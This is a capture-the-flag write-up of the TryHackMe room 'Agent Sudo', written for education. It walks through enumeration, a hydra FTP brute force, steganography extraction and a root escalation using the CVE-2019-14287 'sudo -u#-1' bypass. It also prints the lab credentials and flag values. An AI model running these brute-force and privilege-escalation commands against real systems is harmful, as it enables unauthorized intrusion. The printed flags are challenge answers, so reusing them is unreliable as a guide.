# 🛡️ TryHackMe – Agent Sudo - Writeup

## 📌 Overview
**Room Name:** Agent Sudo  
**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Steganography / Brute Force / CVE

You found a secret server located under the deep sea. Your task is to hack inside the server and reveal the truth.

The attack chain involves:

- User-Agent manipulation to discover hidden redirect
- FTP brute force to gain credentials
- Multi-layer steganography (binwalk, zip cracking, steghide, Base64)
- SSH login with recovered credentials
- Privilege escalation via CVE-2019-14287 (Sudo UID bypass)

---

## 🔍 1. Enumeration

### 🔎 Port Scanning
Initial scan with `rustscan`:

```bash
rustscan -a <IP_ADDRESS>
```

```text
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

### 🕵️ Web Clue Discovery
Accessing port 80 displayed a message from **Agent R**:

> "Use your own codename as user-agent to access the site."

---

## 🔓 2. Initial Access

### 🧑‍💻 User-Agent Manipulation
Using `Burp Suite`, the correct User-Agent was found to be `Agent C`, which redirected to `agent_C_attention.php` and revealed:

- Agent C = **Chris**
- Password is weak

### 🔐 FTP Brute Force
Used `hydra` to brute-force FTP login for user `chris`:

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.49.137.239
```

**Credentials:**
```
Username: chris
Password: crystal
```

### 📂 FTP File Discovery
Files found on FTP:

```
To_agentJ.txt
cutie.png
cute-alien.jpg
```

### 🔍 PNG Analysis — `cutie.png`
Running `binwalk` revealed an embedded zip archive:

```bash
binwalk -e cutie.png
cd _cutie.png.extracted
```

Cracked zip password with `john`:

```bash
zip2john 8702.zip > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

**Zip Password:** `alien`

Contents of `To_agentR.txt` after extraction:

```
Agent C,
We need to send the picture to 'QXJlYTUx' as soon as possible!
By, Agent R
```

Decoded Base64:

```bash
echo 'QXJlYTUx' | base64 -d
# Area51
```

### 👽 JPEG Steganography — `cute-alien.jpg`
Extracted hidden message with `steghide`:

```bash
steghide extract -sf cute-alien.jpg
# Passphrase: Area51
```

Contents of `message.txt`:

```
Hi james,
Glad you find this message. Your login password is hackerrules!
```

SSH login:

```bash
ssh james@<IP_ADDRESS>
# Password: hackerrules!
```

**Initial access as `james` achieved.** ✅

---

## 👑 3. Privilege Escalation: james → root

### 🔍 Sudo Permissions

```bash
sudo -l
```

```text
(ALL, !root) /bin/bash
```

### ⚠️ CVE-2019-14287 (Sudo UID Bypass)
Confirmed vulnerable version:

```bash
sudo -V
# Sudo version 1.8.21p2
```

Exploited with:

```bash
sudo -u#-1 /bin/bash
```

**ROOT ACCESS GRANTED.** ✅

---

## 🏁 Flags

### 🧍 User Flag

```bash
cat user.txt
```

```
b03d975e8c92a7c04146cfa7a5a313c7
```

### 👑 Root Flag

```bash
cat /root/root.txt
```

```
b53a02f55b57d4439e3341834d70c062
```

---

## 📚 Key Takeaways

- 🔍 **User-Agent as Access Control:** HTTP headers can gate access to content. Always inspect server responses carefully for hidden logic.
- 🕵️ **Layered Steganography:** Secrets can be hidden across multiple layers — compressed archives, chained encoding, and image embeds all in sequence.
- 🗝️ **Weak Credentials = Easy Target:** FTP access relied entirely on a weak password. Common in real environments and still a major attack vector.
- 🐚 **Misconfigured Sudo is Dangerous:** `(ALL, !root)` looks restrictive, but older sudo versions allow a UID-based bypass with `-u#-1`. Always patch known CVEs.
- 🔐 **Validate File Metadata and Hidden Data:** Use `strings`, `exiftool`, and `binwalk` — files often contain more than they visually present.

---

## 🛠️ Tools Used

- `rustscan`
- `hydra`
- `binwalk`
- `zip2john`, `john`
- `steghide`
- `Burp Suite`
- `ssh`, `sudo`
- `base64`
- `7z`, `strings`, `exiftool`

---

## 📚 Credit
✍️ Author: Akira Hasuo

📘 Created for educational and portfolio purposes only
